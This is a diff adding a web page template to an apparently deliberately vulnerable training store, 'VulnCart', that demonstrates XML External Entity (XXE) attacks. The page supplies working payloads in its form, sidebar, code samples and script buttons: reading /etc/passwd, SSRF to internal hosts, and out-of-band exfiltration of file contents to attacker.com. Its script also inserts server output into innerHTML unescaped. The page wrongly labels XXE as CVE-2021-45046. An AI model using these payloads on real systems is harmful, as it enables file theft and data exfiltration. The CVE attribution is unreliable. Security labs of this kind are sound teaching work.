@@ -1,0 +1,234 @@
+{% extends "base.html" %}
+
+{% block title %}XXE Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2021-45046: XXE Vulnerability Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates XML External Entity (XXE) vulnerabilities for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>XXE Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>XML External Entity (XXE) attacks occur when weakly configured XML parsers support XML features that allow external entity references.</p>
+                
+                <form method="POST" id="xxeForm">
+                    <div class="mb-3">
+                        <label for="xml_data" class="form-label">XML Payload:</label>
+                        <textarea class="form-control" id="xml_data" name="xml_data" rows="8" 
+                                  placeholder="Enter XML payload here...">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Test XXE</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>File Read:</h6>
+                <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>
+                
+                <hr>
+                
+                <h6>SSRF:</h6>
+                <code>&lt;!ENTITY xxe SYSTEM "http://internal-server.com"&gt;</code>
+                
+                <hr>
+                
+                <h6>Parameter Entity:</h6>
+                <code>&lt;!ENTITY % xxe SYSTEM "http://malicious.com/evil.dtd"&gt;</code>
+                
+                <hr>
+                
+                <h6>Out-of-Band:</h6>
+                <code>&lt;!ENTITY xxe SYSTEM "http://attacker.com/?data="&gt;</code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>XXE Payload Examples</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Basic File Read:</h6>
+                        <pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>SSRF Attack:</h6>
+                        <pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "http://internal-server.com" &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <div class="row mt-3">
+                    <div class="col-md-6">
+                        <h6>Parameter Entity:</h6>
+                        <pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfil;]&gt;
+&lt;data&gt;test&lt;/data&gt;</code></pre>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Out-of-Band:</h6>
+                        <pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "http://attacker.com/collect" &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2021-45046 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>XML External Entity (XXE) attacks occur when weakly configured XML parsers support XML features that allow external entity references.</p>
+                
+                <h6>Common Attack Vectors:</h6>
+                <ul>
+                    <li>File inclusion attacks</li>
+                    <li>Server-side request forgery (SSRF)</li>
+                    <li>Denial of service (DoS)</li>
+                    <li>Information disclosure</li>
+                    <li>Remote code execution (in some cases)</li>
+                </ul>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Read arbitrary files from the server</li>
+                    <li>Access internal network resources</li>
+                    <li>Exfiltrate sensitive data</li>
+                    <li>Perform SSRF attacks</li>
+                    <li>Cause denial of service</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Disable external entity processing</li>
+                    <li>Use secure XML parsers</li>
+                    <li>Implement input validation</li>
+                    <li>Use allowlist for allowed entities</li>
+                    <li>Update XML libraries to latest versions</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('xxeForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const xmlData = document.getElementById('xml_data').value;
+        const resultDiv = document.getElementById('result');
+        
+        fetch('/xxe', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'xml_data=' + encodeURIComponent(xmlData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong> ${data.result.join('<br>')}
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    // Quick payload buttons
+    const payloads = [
+        {
+            name: "File Read",
+            payload: `<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>`
+        },
+        {
+            name: "SSRF",
+            payload: `<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://internal-server.com" >]>
+<foo>&xxe;</foo>`
+        },
+        {
+            name: "Parameter Entity",
+            payload: `<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfil;]>
+<data>test</data>`
+        }
+    ];
+    
+    payloads.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('xml_data').value = item.payload;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
